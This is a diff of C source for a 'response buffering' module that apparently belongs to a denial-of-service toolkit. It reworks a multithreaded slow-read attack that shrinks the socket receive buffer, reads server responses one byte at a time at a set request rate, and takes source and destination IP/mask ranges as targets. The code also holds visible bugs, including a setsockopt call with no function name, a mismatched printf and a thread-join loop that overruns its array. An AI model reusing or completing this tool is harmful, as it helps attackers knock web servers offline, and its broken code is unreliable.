@@ -3,6 +3,7 @@
 #include "../base/make_tcp.h"
 #include "../base/receiver.h"
 #include "../ddos/body_buffering.h"
+#include "../base/subnet_mask.h"
 
 unsigned int respbuffer_total;
 unsigned int respbuffer_produced;
@@ -12,19 +13,21 @@ unsigned int respbuffer_per_second;
 unsigned int respbuffer_duration;
 double respbuffer_elapsed_time;
 
-char *respbuffer_dest_ip;
-char *respbuffer_src_ip;
-int respbuffer_src_port;
+char respbuffer_dest_ip[16];
+char respbuffer_src_ip[16];
+
 int respbuffer_dest_port;
 
-int respbuffer_generated_count;
-short respbuffer_timed_finisher;
+int respbuffer_src_ip_mask;
+int respbuffer_dest_ip_mask;
 
-clock_t respbuffer_global_time;
-clock_t respbuffer_global_elapsed_time;
+char respbuffer_now_src_ip[16];
+char respbuffer_now_dest_ip[16];
 
 pthread_mutex_t respbuffer_mutex = PTHREAD_MUTEX_INITIALIZER;
 pthread_cond_t respbuffer_cond = PTHREAD_COND_INITIALIZER;
+
+struct timespec respbuffer_time1, respbuffer_time2;
 
 char respbuffer_request[__BODY_BUFFERING_REQUEST_MSG_SIZE__ ];
 
@@ -37,33 +40,25 @@ void response_buffering_print_usage(int mode) {
 
 	if (mode == 2)
 		printf(
-				"response buffering Usage : [Src-IP] [Dest-IP] [# thread] [# per seconds(0 for INF)] [duration (0 for INF)] [Src-Port] [Dest-Port]\n");
+				"response buffering Usage : [Src-IP/mask] [Dest-IP/mask] [Dest-Port] [# requests/s]\n");
 }
 
 void* generate_response_buffering1(void *data) {
 	int thread_id = *((int*) data);
-	clock_t thread_clock;
 
 	int first_run = 1;
 	int sock = -1;
 	while (1) {
 
 		pthread_mutex_lock(&respbuffer_mutex);
-		thread_clock = clock();
 
 		//making tcp connection
 
-		double elapsed_time = ((double) (thread_clock - respbuffer_global_time))
-						/ CLOCKS_PER_SEC;
-
-				if (elapsed_time < 25.0) {
-					pthread_cond_wait(&respbuffer_cond, &respbuffer_mutex);
-				}
-
 		if (first_run == 1) {
 			sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-			int rvsz=2;
-			if( (sock,SOL_SOCKET,SO_RCVBUF,(const char*)&rvsz, sizeof(rvsz)) == -1 )
+			int rvsz = 2;
+			if ((sock, SOL_SOCKET, SO_RCVBUF, (const char*) &rvsz, sizeof(rvsz))
+					== -1)
 				perror("setsockopt failure.\n");
 
 			//setsockopt(sock,IPPROTO_TCP,TCP_NODELAY,&tcpnod,sizeof(tcpnod));
@@ -86,8 +81,7 @@ void* generate_response_buffering1(void *data) {
 			 first_run = 0;
 			 printf("Sock : %d\n",sock);
 			 */
-			char http_request[] =
-					"GET / HTTP/1.1\r\nHost: localhost\r\n\r\n";
+			char http_request[] = "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n";
 			if ((send(sock, http_request, strlen(http_request), 0)) < 0) {
 				perror("get send err\n");
 			}
@@ -99,11 +93,34 @@ void* generate_response_buffering1(void *data) {
 		int recv_size = -9;
 		char buffer[1];
 
-		recv_size = read(sock,buffer,sizeof(buffer));
+		//Conditions begin.
+		if (respbuffer_produced >= respbuffer_per_second) {
+			pthread_cond_wait(&respbuffer_cond, &respbuffer_mutex);
+		}
 
-		printf("recv : %d :: [%c]\n", recv_size, buffer[0]);
+		//Get Time
+		clock_gettime(CLOCK_MONOTONIC, &respbuffer_time2);
+		double respbuffer_elapsed_time = (respbuffer_time2.tv_sec
+				- respbuffer_time1.tv_sec)
+				+ ((respbuffer_time2.tv_nsec - respbuffer_time1.tv_nsec)
+						/ 1000000000.0);
 
-		pthread_cond_signal(&respbuffer_cond);
+		//If time > 1.0
+		if (respbuffer_elapsed_time >= 1.0) {
+			printf("-.\n");
+			respbuffer_produced = 0;
+			clock_gettime(CLOCK_MONOTONIC, &respbuffer_time1);
+			pthread_cond_signal(&respbuffer_cond);
+		}
+
+		recv_size = read(sock, buffer, sizeof(buffer));
+
+
+
+		respbuffer_produced++;
+		respbuffer_total++;
+
+		printf("%d recv :[%c]\n",respbuffer_produced, recv_size, buffer[0]);
 
 		pthread_mutex_unlock(&respbuffer_mutex);
 
@@ -115,73 +132,68 @@ void* generate_response_buffering1(void *data) {
 }
 
 void* generate_response_buffering2(void *data) {
-	int thread_id = *((int*) data);
-	clock_t thread_clock;
+	/*int thread_id = *((int*) data);
+	 clock_t thread_clock;
 
-	int sock;
-	while (1) {
+	 int sock;
+	 while (1) {
 
-		pthread_mutex_lock(&respbuffer_mutex);
-		thread_clock = clock();
-		respbuffer_elapsed_time = ((double) (thread_clock
-				- respbuffer_global_elapsed_time)) / CLOCKS_PER_SEC;
+	 pthread_mutex_lock(&respbuffer_mutex);
+	 thread_clock = clock();
+	 respbuffer_elapsed_time = ((double) (thread_clock
+	 - respbuffer_global_elapsed_time)) / CLOCKS_PER_SEC;
 
-		if (respbuffer_elapsed_time >= respbuffer_duration) {
-			pthread_mutex_unlock(&respbuffer_mutex);
-			pthread_cond_broadcast(&respbuffer_cond);
-			respbuffer_timed_finisher = 1;
-			return 0;
-		}
+	 if (respbuffer_elapsed_time >= respbuffer_duration) {
+	 pthread_mutex_unlock(&respbuffer_mutex);
+	 pthread_cond_broadcast(&respbuffer_cond);
+	 respbuffer_timed_finisher = 1;
+	 return 0;
+	 }
 
-		if (respbuffer_produced >= respbuffer_per_second) {
-			pthread_cond_wait(&respbuffer_cond, &respbuffer_mutex);
-		}
+	 if (respbuffer_produced >= respbuffer_per_second) {
+	 pthread_cond_wait(&respbuffer_cond, &respbuffer_mutex);
+	 }
 
-		int sock = tcp_make_connection(inet_addr(respbuffer_src_ip),
-				inet_addr(respbuffer_dest_ip), respbuffer_src_port,
-				respbuffer_dest_port, SOCK_PACKET);
-		respbuffer_src_port++;
-		if (respbuffer_src_port >= 65000)
-			respbuffer_src_port = 10000;
+	 int sock = tcp_make_connection(inet_addr(respbuffer_src_ip),
+	 inet_addr(respbuffer_dest_ip), respbuffer_src_port,
+	 respbuffer_dest_port, SOCK_PACKET);
+	 respbuffer_src_port++;
+	 if (respbuffer_src_port >= 65000)
+	 respbuffer_src_port = 10000;
 
-		send(sock, respbuffer_request, __BODY_BUFFERING_REQUEST_MSG_SIZE__, 0);
+	 send(sock, respbuffer_request, __BODY_BUFFERING_REQUEST_MSG_SIZE__, 0);
 
-		respbuffer_produced++;
-		respbuffer_total++;
-		respbuffer_generated_count++;
+	 respbuffer_produced++;
+	 respbuffer_total++;
+	 respbuffer_generated_count++;
 
-		pthread_cond_signal(&respbuffer_cond);
-		close(sock);
-		pthread_mutex_unlock(&respbuffer_mutex);
+	 pthread_cond_signal(&respbuffer_cond);
+	 close(sock);
+	 pthread_mutex_unlock(&respbuffer_mutex);
 
-	}
+	 }
 
-	return 0;
+	 return 0;*/
 }
 
 void* respbuffer_time_check(void *data) {
-	int thread_id = *((int*) data);
-	clock_t t1;
-	t1 = clock();
-	respbuffer_global_elapsed_time = clock();
-	double time_taken;
 
 	while (1) {
 		pthread_mutex_lock(&respbuffer_mutex);
+		clock_gettime(CLOCK_MONOTONIC, &respbuffer_time2);
+		double respbuffer_elapsed_time = (respbuffer_time2.tv_sec
+				- respbuffer_time1.tv_sec)
+				+ ((respbuffer_time2.tv_nsec - respbuffer_time1.tv_nsec)
+						/ 1000000000.0);
 
-		respbuffer_global_time = clock();
-		respbuffer_elapsed_time = ((double) (respbuffer_global_time
-				- respbuffer_global_elapsed_time)) / CLOCKS_PER_SEC;
-		if (respbuffer_timed_finisher == 1)
-			return 0;
-		time_taken = ((double) (respbuffer_global_time - t1)) / CLOCKS_PER_SEC;
-
-		if (time_taken >= 1.0) {
+		//If time > 1.0
+		if (respbuffer_elapsed_time >= 1.0) {
+			printf("-.\n");
 			respbuffer_produced = 0;
-			t1 = clock();
-			time_taken = 0;
+			clock_gettime(CLOCK_MONOTONIC, &respbuffer_time1);
 			pthread_cond_signal(&respbuffer_cond);
 		}
+
 		pthread_mutex_unlock(&respbuffer_mutex);
 	}
 }
@@ -211,68 +223,41 @@ void response_buffering_run(char *argv[], int mode) {
 	strcpy(respbuffer_request,
 			"GET / HTTP/1.1\r\nHost: http://www.examplewebsitenotexisting.com\r\n");
 
-	respbuffer_src_ip = (char*) malloc(sizeof(char) * 20);
-	respbuffer_dest_ip = (char*) malloc(sizeof(char) * 20);
 	int argc = 0;
-	respbuffer_generated_count = 0;
-	respbuffer_timed_finisher = 0;
+
+	respbuffer_produced = 0;
+
 	while (argv[argc] != NULL) {
 		argc++;
 	}
 
-	if (mode == 1 && argc != 6) {
-		body_buffering_print_usage(mode);
-		return;
-	} else if (mode == 2 && argc != 7) {
+	if (mode == 2 && argc != 4) {
 		body_buffering_print_usage(mode);
 		return;
 	}
-
-	strcpy(respbuffer_src_ip, argv[0]);
 
 	respbuffer_produced = 0;
-	if (mode == 1) {
-		respbuffer_total = atoi(argv[3]);
-		respbuffer_src_port = atoi(argv[4]);
 
-		//socket preparation & clock preparation
-		respbuffer_sockets = (int*) malloc(sizeof(int) * respbuffer_total);
+	get_ip_from_ip_addr(argv[0], respbuffer_src_ip);
+	respbuffer_src_ip_mask = get_mask_from_ip_addr(argv[0]);
+	strcpy(respbuffer_now_src_ip, respbuffer_src_ip);
 
-		respbuffer_clocks = (clock_t*) malloc(
-				sizeof(clock_t) * respbuffer_total);
-
-		respbuffer_current = 0;
-
-		int tmp;
-		for (tmp = 0; tmp < respbuffer_total; tmp++) {
-			respbuffer_sockets[tmp] = -2;
-			respbuffer_clocks[tmp] = clock();
-		}
-
-		respbuffer_dest_port = atoi(argv[5]);
-
-		if (respbuffer_total == 0)
-			respbuffer_total = __UINT_MAXIMUM__;
-
-	}
+	get_ip_from_ip_addr(argv[1], respbuffer_dest_ip);
+	respbuffer_dest_ip_mask = get_mask_from_ip_addr(argv[1]);
+	strcpy(respbuffer_now_dest_ip, respbuffer_dest_ip);
 
 	if (mode == 2) {
 		respbuffer_total = 0;
 		respbuffer_per_second = atoi(argv[3]);
-		respbuffer_duration = atoi(argv[4]);
-		if (respbuffer_duration == 0)
-			respbuffer_duration = __UINT_MAXIMUM__;
 
 		if (respbuffer_per_second == 0)
 			respbuffer_per_second = __UINT_MAXIMUM__;
 
-		respbuffer_src_port = atoi(argv[5]);
-		respbuffer_dest_port = atoi(argv[6]);
+		respbuffer_dest_port = atoi(argv[2]);
 	}
 
-	int num_threads = atoi(argv[2]);
-
-	strcpy(respbuffer_dest_ip, argv[1]);
+	//Thread default 10.
+	int num_threads = 10;
 
 	int *generate_thread_id, *receive_thread_id;
 	pthread_t *generate_thread, *receive_thread;
@@ -289,11 +274,13 @@ void response_buffering_run(char *argv[], int mode) {
 
 	for (i = 0; i < num_threads; i++) {
 		if (mode == 1)
-			pthread_create(&generate_thread[i], NULL, generate_response_buffering1,
+			pthread_create(&generate_thread[i], NULL,
+					generate_response_buffering1,
 					(void*) &generate_thread_id[i]);
 		if (mode == 2) {
 			printf("thread %d created\n", i);
-			pthread_create(&generate_thread[i], NULL, generate_response_buffering1,
+			pthread_create(&generate_thread[i], NULL,
+					generate_response_buffering1,
 					(void*) &generate_thread_id[i]);
 			/*RECEIVE THREAD DEACTIVATION*/
 			//pthread_create(&receive_thread[i],NULL,receive_get,(void*)&receive_thread_id[i]);
@@ -305,7 +292,7 @@ void response_buffering_run(char *argv[], int mode) {
 			(void*) &generate_thread_id[i]);
 	num_threads++;
 
-	for (i = 0; i < num_threads; i++) {
+	for (i = 0; i < num_threads+1; i++) {
 		void *status1, *status2;
 		pthread_join(generate_thread[i], &status1);
 		/*RECEIVE THREAD DEACTIVATION*/
@@ -320,9 +307,6 @@ void response_buffering_run(char *argv[], int mode) {
 
 	free(generate_thread_id);
 	free(generate_thread);
-	free(respbuffer_src_ip);
-	free(respbuffer_dest_ip);
-	free(respbuffer_sockets);
-	free(respbuffer_clocks);
+
 	return;
 }
